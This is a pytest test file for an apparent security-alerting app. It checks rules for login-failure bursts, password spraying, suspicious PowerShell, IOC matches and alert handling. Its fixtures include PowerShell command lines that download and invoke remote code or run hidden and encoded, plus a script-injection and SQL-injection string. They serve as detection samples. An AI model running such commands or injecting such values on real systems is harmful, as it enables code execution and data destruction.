from __future__ import annotations

import json
from datetime import UTC, datetime, timedelta

import pytest

from app.context import AppContext, build_context
from app.domain.enums import AlertStatus, InputFormat, Severity, SourceType
from app.domain.errors import InvalidRuleConfigError, InvalidTransitionError, NotFoundError
from app.ingestion.demo import ingest_demo
from app.ingestion.iocs import load_demo_iocs, load_iocs, parse_iocs
from app.storage.repositories import EventFilters

T0 = datetime(2026, 3, 10, 13, 0, 0, tzinfo=UTC)
_counter = {"n": 0}


def row(seconds: int, **fields) -> dict:
    """A raw record at T0 + seconds. Each gets a unique id so identical rows never collapse."""
    _counter["n"] += 1
    return {
        "event_id": f"T-{_counter['n']}",
        "timestamp": (T0 + timedelta(seconds=seconds)).isoformat(),
        **fields,
    }


def auth(
    seconds: int,
    outcome: str,
    user: str | None = "dave",
    ip: str | None = "203.0.113.45",
    **extra,
) -> dict:
    data = {"event_type": "auth", "outcome": outcome, "host": "VPN-GW01", **extra}
    if user is not None:
        data["user"] = user
    if ip is not None:
        data["src_ip"] = ip
    return row(seconds, **data)


def ingest(ctx: AppContext, rows: list[dict], source_id: str = "t"):
    content = "\n".join(json.dumps(r) for r in rows).encode()
    return ctx.ingestion.ingest_bytes(
        content,
        InputFormat.JSONL,
        source_id=source_id,
        source_type=SourceType.UPLOAD,
        source_name=source_id,
    )


def rule_alerts(ctx: AppContext, rule_id: str):
    return ctx.alerts.list(rule_id=rule_id)


# --- repeated failures ---------------------------------------------------------------------


def test_repeated_failures_alerts_with_exact_event_links(ctx):
    rows = [auth(i * 10, "failure") for i in range(5)]
    ingest(ctx, rows)
    (alert,) = rule_alerts(ctx, "auth.repeated_failures")
    assert alert.severity is Severity.MEDIUM
    assert alert.status is AlertStatus.NEW
    assert alert.rule_version == 1
    assert alert.event_count == 5
    assert "dave" in alert.explanation and "203.0.113.45" in alert.explanation
    linked = {link.event_id for link in ctx.alerts.events_for(alert.alert_id)}
    stored = {e.event_id for e in ctx.events.search(EventFilters()).events}
    assert linked == stored


def test_threshold_is_exclusive_below(ctx):
    ingest(ctx, [auth(i * 10, "failure") for i in range(4)])
    assert ctx.alerts.count() == 0


def test_window_boundary_is_inclusive(ctx):
    # 5 failures spanning exactly 300 seconds fire; spanning 301 do not.
    ingest(ctx, [auth(s, "failure") for s in (0, 75, 150, 225, 300)], "edge")
    assert len(rule_alerts(ctx, "auth.repeated_failures")) == 1


def test_window_boundary_just_outside_does_not_fire(ctx):
    ingest(ctx, [auth(s, "failure") for s in (0, 75, 150, 225, 301)])
    assert ctx.alerts.count() == 0


def test_failures_missing_user_or_src_ip_are_ignored(ctx):
    ingest(ctx, [auth(i * 10, "failure", user=None) for i in range(6)], "no-user")
    ingest(ctx, [auth(i * 10, "failure", ip=None) for i in range(6)], "no-ip")
    assert ctx.alerts.count() == 0


def test_failures_for_different_users_do_not_combine(ctx):
    rows = [auth(i * 10, "failure", user=f"user{i}") for i in range(4)]
    rows += [auth(i * 10 + 5, "failure", user=f"other{i}") for i in range(4)]
    ingest(ctx, rows)
    assert not rule_alerts(ctx, "auth.repeated_failures")


def test_two_separate_bursts_give_two_alerts(ctx):
    rows = [auth(i * 10, "failure") for i in range(5)]
    rows += [auth(7200 + i * 10, "failure") for i in range(5)]
    ingest(ctx, rows)
    assert len(rule_alerts(ctx, "auth.repeated_failures")) == 2


# --- failures then success -----------------------------------------------------------------


def test_failures_then_success_links_failures_and_success(ctx):
    rows = [auth(i * 20, "failure") for i in range(4)] + [auth(300, "success")]
    ingest(ctx, rows)
    (alert,) = rule_alerts(ctx, "auth.failures_then_success")
    assert alert.severity is Severity.HIGH
    assert alert.event_count == 5
    reasons = {link.reason for link in ctx.alerts.events_for(alert.alert_id)}
    assert "successful logon after the burst" in reasons


def test_benign_typos_then_success_do_not_alert(ctx):
    ingest(ctx, [auth(0, "failure", user="bob"), auth(20, "failure", user="bob")], "typo-f")
    ingest(ctx, [auth(60, "success", user="bob")], "typo-s")
    assert ctx.alerts.count() == 0


def test_success_after_the_window_does_not_alert(ctx):
    rows = [auth(i * 20, "failure") for i in range(4)]
    last = 3 * 20
    ingest(ctx, [*rows, auth(last + 901, "success")])
    assert not rule_alerts(ctx, "auth.failures_then_success")
    ingest(ctx, [auth(last + 900, "success")], "boundary")
    assert len(rule_alerts(ctx, "auth.failures_then_success")) == 1


def test_success_from_another_ip_or_before_failures_does_not_alert(ctx):
    rows = [auth(i * 20 + 100, "failure") for i in range(4)]
    rows += [auth(50, "success"), auth(300, "success", ip="198.51.100.9")]
    ingest(ctx, rows)
    assert not rule_alerts(ctx, "auth.failures_then_success")


def test_success_arriving_later_completes_the_alert(ctx):
    ingest(ctx, [auth(i * 20, "failure") for i in range(4)], "fails")
    assert not rule_alerts(ctx, "auth.failures_then_success")
    ingest(ctx, [auth(200, "success")], "later")
    assert len(rule_alerts(ctx, "auth.failures_then_success")) == 1


# --- password spray ------------------------------------------------------------------------


def test_password_spray_needs_distinct_users(ctx):
    ingest(ctx, [auth(i * 10, "failure", user=f"u{i}", ip="192.0.2.77") for i in range(4)], "a")
    assert not rule_alerts(ctx, "auth.password_spray")
    ingest(ctx, [auth(50, "failure", user="u4", ip="192.0.2.77")], "b")
    (alert,) = rule_alerts(ctx, "auth.password_spray")
    assert alert.event_count == 5
    assert "u0" in alert.explanation


def test_one_user_many_failures_is_not_a_spray(ctx):
    ingest(ctx, [auth(i * 5, "failure") for i in range(12)])
    assert not rule_alerts(ctx, "auth.password_spray")


# --- suspicious PowerShell -----------------------------------------------------------------


def proc(
    seconds: int,
    command: str,
    name="powershell.exe",
    host: str | None = "WS-DAVE04",
    user="dave",
    **x,
):
    data = {"event_type": "process", "process_name": name, "command_line": command, "host": host}
    if user:
        data["user"] = user
    return row(seconds, **data, **x)


@pytest.mark.parametrize(
    ("command", "indicator"),
    [
        ("powershell.exe -nop -w hidden -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQA", "encoded command"),
        ("powershell.exe -windowstyle hidden -File x.ps1", "hidden window"),
        ("powershell -c \"(New-Object Net.WebClient).DownloadString('http://x/a')\"", "download"),
        ('pwsh.exe -c "IEX $payload"', "invoke-expression"),
    ],
)
def test_powershell_indicators_alert(ctx, command, indicator):
    ingest(ctx, [proc(0, command)])
    (alert,) = rule_alerts(ctx, "process.suspicious_powershell")
    assert indicator in alert.explanation
    assert alert.severity is Severity.HIGH


@pytest.mark.parametrize(
    "command",
    [
        "powershell.exe -NoProfile -Command Get-ChildItem C:\\IT\\Reports",
        "powershell.exe -ExecutionPolicy Bypass -File C:\\IT\\Scripts\\inventory.ps1",
        "powershell.exe -Command Get-Process",
    ],
)
def test_benign_powershell_lookalikes_do_not_alert(ctx, command):
    ingest(ctx, [proc(0, command, signed_script="true")])
    assert ctx.alerts.count() == 0


def test_indicator_text_in_other_processes_or_missing_fields_is_ignored(ctx):
    cmd = "-enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQA"
    ingest(ctx, [proc(0, "cmd.exe /c " + cmd, name="cmd.exe")], "other-proc")
    ingest(ctx, [row(5, event_type="process", process_name="powershell.exe", host="H")], "nocmd")
    ingest(ctx, [proc(10, "powershell -enc " + cmd[5:], host=None)], "nohost")
    assert ctx.alerts.count() == 0


def test_close_powershell_events_share_one_alert(ctx):
    cmd = "powershell.exe -nop -w hidden -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQA"
    ingest(ctx, [proc(0, cmd), proc(90, "powershell -c IEX (New-Object Net.WebClient)")])
    (alert,) = rule_alerts(ctx, "process.suspicious_powershell")
    assert alert.event_count == 2
    ingest(ctx, [proc(5000, cmd)], "much-later")
    assert len(rule_alerts(ctx, "process.suspicious_powershell")) == 2


# --- local IOC -----------------------------------------------------------------------------


def net(seconds: int, dst="203.0.113.80", host: str | None = "WS-DAVE04", **x):
    data = {"event_type": "network", "dst_ip": dst, "dst_port": 80, **x}
    if host:
        data["host"] = host
    return row(seconds, **data)


def test_no_ioc_list_means_no_ioc_alerts(ctx):
    ingest(ctx, [net(0)])
    assert ctx.alerts.count() == 0


def test_ioc_connection_alerts_with_confidence_severity(ctx):
    load_demo_iocs(ctx.iocs)
    ingest(ctx, [net(0), net(30), net(10, dst="192.0.2.10")])
    (alert,) = rule_alerts(ctx, "network.local_ioc_match")
    assert alert.severity is Severity.HIGH
    assert alert.event_count == 2
    assert "demo-intel" in alert.explanation


def test_medium_confidence_ioc_is_medium_severity(ctx):
    load_demo_iocs(ctx.iocs)
    ingest(ctx, [net(0, dst="192.0.2.77")])
    (alert,) = rule_alerts(ctx, "network.local_ioc_match")
    assert alert.severity is Severity.MEDIUM


def test_ioc_event_without_host_falls_back_to_src_ip_or_is_skipped(ctx):
    load_demo_iocs(ctx.iocs)
    ingest(ctx, [net(0, host=None, src_ip="10.0.0.9")], "has-ip")
    assert ctx.alerts.count() == 1
    ingest(ctx, [net(0, host=None)], "nobody")
    assert ctx.alerts.count() == 1


def test_ioc_loader_validates_rows():
    csv_bytes = (
        b"indicator,type,source,confidence,description,added\n"
        b"203.0.113.80,ip,s,HIGH,d,2026-01-01\n"
        b"not-an-ip,ip,s,high,d,\n"
        b",ip,s,high,d,\n"
        b"x.example,url,s,high,d,\n"
        b"EXAMPLE.org,domain,s,,,\n"
    )
    iocs, errors = parse_iocs(csv_bytes)
    assert [(i.indicator, i.confidence) for i in iocs] == [
        ("203.0.113.80", "high"),
        ("example.org", "medium"),
    ]
    assert len(errors) == 3


def test_ioc_load_is_idempotent(ctx):
    for _ in range(2):
        load_demo_iocs(ctx.iocs)
    assert ctx.iocs.count() == 4
    result = load_iocs(ctx.iocs, b"indicator,type\n1.2.3.4,ip\n")
    assert result.loaded == 1 and ctx.iocs.count() == 5


# --- dedup, suppression, replay-safety -----------------------------------------------------


def test_reingesting_the_same_data_creates_no_new_alerts(ctx):
    rows = [auth(i * 10, "failure") for i in range(6)]
    ingest(ctx, rows)
    before = [(a.alert_id, a.event_count) for a in ctx.alerts.list()]
    again = ingest(ctx, rows)
    assert again.inserted == 0
    assert [(a.alert_id, a.event_count) for a in ctx.alerts.list()] == before


def test_incremental_and_bulk_ingest_give_identical_alerts(settings):
    rows = [auth(i * 10, "failure") for i in range(8)] + [auth(120, "success")]
    bulk = build_context(settings, ":memory:")
    ingest(bulk, rows)
    incremental = build_context(settings, ":memory:")
    for r in rows:
        ingest(incremental, [r])

    def shape(c):
        return sorted(
            (a.rule_id, a.event_count, a.first_seen, a.last_seen) for a in c.alerts.list()
        )

    assert shape(incremental) == shape(bulk)
    assert len(bulk.alerts.list()) == 2


def test_late_earlier_event_extends_the_same_alert(ctx):
    ingest(ctx, [auth(100 + i * 10, "failure") for i in range(5)], "first")
    (alert,) = rule_alerts(ctx, "auth.repeated_failures")
    ingest(ctx, [auth(95, "failure")], "late")
    (after,) = rule_alerts(ctx, "auth.repeated_failures")
    assert after.alert_id == alert.alert_id
    assert after.event_count == 6
    assert after.first_seen < alert.first_seen


def test_closed_alert_absorbs_new_matches_without_reopening(ctx):
    ingest(ctx, [auth(i * 10, "failure") for i in range(5)], "a")
    (alert,) = rule_alerts(ctx, "auth.repeated_failures")
    ctx.detection.transition(alert.alert_id, AlertStatus.FALSE_POSITIVE)
    ingest(ctx, [auth(55, "failure")], "b")
    (after,) = rule_alerts(ctx, "auth.repeated_failures")
    assert after.alert_id == alert.alert_id
    assert after.status is AlertStatus.FALSE_POSITIVE
    assert after.event_count == 6


# --- lifecycle and rule configuration ------------------------------------------------------


def test_alert_lifecycle(ctx):
    ingest(ctx, [auth(i * 10, "failure") for i in range(5)])
    (alert,) = ctx.alerts.list()
    for target in (AlertStatus.ACKNOWLEDGED, AlertStatus.INVESTIGATING, AlertStatus.RESOLVED):
        ctx.detection.transition(alert.alert_id, target)
        assert ctx.alerts.get(alert.alert_id).status is target
    with pytest.raises(InvalidTransitionError):
        ctx.detection.transition(alert.alert_id, AlertStatus.INVESTIGATING)
    ctx.detection.transition(alert.alert_id, AlertStatus.NEW)
    with pytest.raises(NotFoundError):
        ctx.detection.transition("missing", AlertStatus.RESOLVED)


def test_disabled_rule_does_not_fire_and_rescan_applies_it_later(ctx):
    rule_id = "auth.repeated_failures"
    settings = ctx.detection.rule_settings.get(rule_id)
    ctx.detection.configure(rule_id, enabled=False, config=settings.config)
    ingest(ctx, [auth(i * 10, "failure") for i in range(5)])
    assert ctx.alerts.count() == 0
    ctx.detection.configure(rule_id, enabled=True, config={})
    outcome = ctx.detection.rescan()
    assert outcome["created"] == 1
    assert ctx.detection.rescan()["created"] == 0
    assert ctx.alerts.count() == 1


def test_threshold_change_applies(ctx):
    ctx.detection.configure("auth.repeated_failures", enabled=True, config={"threshold": 3})
    ingest(ctx, [auth(i * 10, "failure") for i in range(3)])
    assert len(rule_alerts(ctx, "auth.repeated_failures")) == 1
    stored = ctx.detection.rule_settings.get("auth.repeated_failures")
    assert stored.config == {"threshold": 3, "window_seconds": 300}  # other keys keep values


@pytest.mark.parametrize(
    "config",
    [{"nope": 1}, {"threshold": 0}, {"threshold": -1}, {"threshold": "5"}, {"threshold": True}],
)
def test_invalid_rule_config_is_rejected(ctx, config):
    with pytest.raises(InvalidRuleConfigError):
        ctx.detection.configure("auth.repeated_failures", enabled=True, config=config)
    with pytest.raises(NotFoundError):
        ctx.detection.configure("unknown.rule", enabled=True, config={})


def test_rule_settings_survive_reopening_the_database(tmp_path, settings):
    path = str(tmp_path / "soc.db")
    first = build_context(settings, path)
    first.detection.configure("auth.repeated_failures", enabled=False, config={"threshold": 9})
    first.conn.close()
    second = build_context(settings, path)
    stored = second.detection.rule_settings.get("auth.repeated_failures")
    assert stored is not None
    assert not stored.enabled and stored.config["threshold"] == 9


def test_a_failing_rule_does_not_block_others_or_lose_events(ctx, monkeypatch):
    def boom(*args, **kwargs):
        raise RuntimeError("rule exploded")

    monkeypatch.setattr(ctx.detection.rules["auth.password_spray"], "evaluate", boom)
    result = ingest(ctx, [auth(i * 10, "failure") for i in range(5)])
    assert result.inserted == 5
    assert any("auth.password_spray" in e for e in result.hook_errors)
    assert len(rule_alerts(ctx, "auth.repeated_failures")) == 1
    assert ctx.sources.get("t").last_error


# --- demo dataset --------------------------------------------------------------------------


def demo_shape(c):
    return sorted((a.rule_id, a.severity.value, a.event_count) for a in c.alerts.list())


EXPECTED_DEMO_ALERTS = [
    ("auth.failures_then_success", "high", 13),
    ("auth.password_spray", "medium", 6),
    ("auth.repeated_failures", "medium", 12),
    ("network.local_ioc_match", "high", 1),
    ("process.suspicious_powershell", "high", 2),
]


def test_demo_dataset_produces_the_documented_alerts(ctx):
    load_demo_iocs(ctx.iocs)
    ingest_demo(ctx.ingestion)
    assert demo_shape(ctx) == EXPECTED_DEMO_ALERTS
    # every alert links only to events that exist, and benign users never appear
    for alert in ctx.alerts.list():
        links = ctx.alerts.events_for(alert.alert_id)
        assert len(links) == alert.event_count
        events = ctx.events.get_many([link.event_id for link in links])
        assert len(events) == len(links)
        if alert.rule_id != "auth.password_spray":  # the spray targets six benign accounts
            assert {e.user for e in events} == {"dave"}


def test_demo_alerts_are_reproducible_and_not_duplicated(settings):
    runs = []
    for _ in range(2):
        c = build_context(settings, ":memory:")
        load_demo_iocs(c.iocs)
        ingest_demo(c.ingestion)
        ingest_demo(c.ingestion)
        runs.append(sorted((a.alert_id, a.dedup_key) for a in c.alerts.list()))
    assert runs[0] == runs[1]
    assert len(runs[0]) == 5


def test_demo_without_iocs_has_no_ioc_alert_until_rescan(ctx):
    ingest_demo(ctx.ingestion)
    assert len(ctx.alerts.list()) == 4
    load_demo_iocs(ctx.iocs)
    ctx.detection.rescan()
    assert demo_shape(ctx) == EXPECTED_DEMO_ALERTS


def test_alert_text_from_logs_is_stored_verbatim_not_executed(ctx):
    nasty = "<script>alert(1)</script>'; DROP TABLE alerts;--"
    ingest(ctx, [auth(i * 10, "failure", user=nasty) for i in range(5)])
    (alert,) = ctx.alerts.list()
    assert nasty in alert.title
    assert ctx.alerts.count() == 1


# --- review fixes ----------------------------------------------------------------------------


@pytest.mark.parametrize(
    "name",
    [
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "C:/Program Files/PowerShell/7/pwsh.exe",
        "POWERSHELL.EXE",
    ],
)
def test_powershell_matched_by_executable_name_not_full_path(ctx, name):
    cmd = "-nop -w hidden -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQA"
    ingest(ctx, [proc(0, "powershell.exe " + cmd, name=name)])
    assert len(rule_alerts(ctx, "process.suspicious_powershell")) == 1


def test_a_directory_named_powershell_exe_is_not_powershell(ctx):
    cmd = "-nop -w hidden -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQA"
    ingest(ctx, [proc(0, cmd, name=r"C:\tools\powershell.exe\notepad.exe")])
    assert ctx.alerts.count() == 0


def test_success_in_the_same_second_as_the_last_failure_is_detected(ctx):
    rows = [auth(i * 10, "failure") for i in range(3)] + [auth(20, "success")]
    ingest(ctx, rows)
    (alert,) = rule_alerts(ctx, "auth.failures_then_success")
    assert alert.event_count == 4


def test_two_bursts_sharing_one_success_stay_separate_alerts(ctx):
    # Bursts at 0-40s and 700-740s are more than the 600s failure window apart, and one
    # success at 800s is within 900s of both. Each burst keeps its own alert.
    rows = [auth(i * 10, "failure") for i in range(5)]
    rows += [auth(700 + i * 10, "failure") for i in range(5)]
    rows += [auth(800, "success")]
    ingest(ctx, rows)
    first, second = sorted(
        rule_alerts(ctx, "auth.failures_then_success"), key=lambda a: a.first_seen
    )
    assert (first.event_count, second.event_count) == (6, 6)
    assert first.last_seen == second.last_seen  # the shared success
    assert first.first_seen < second.first_seen
    assert first.explanation != second.explanation
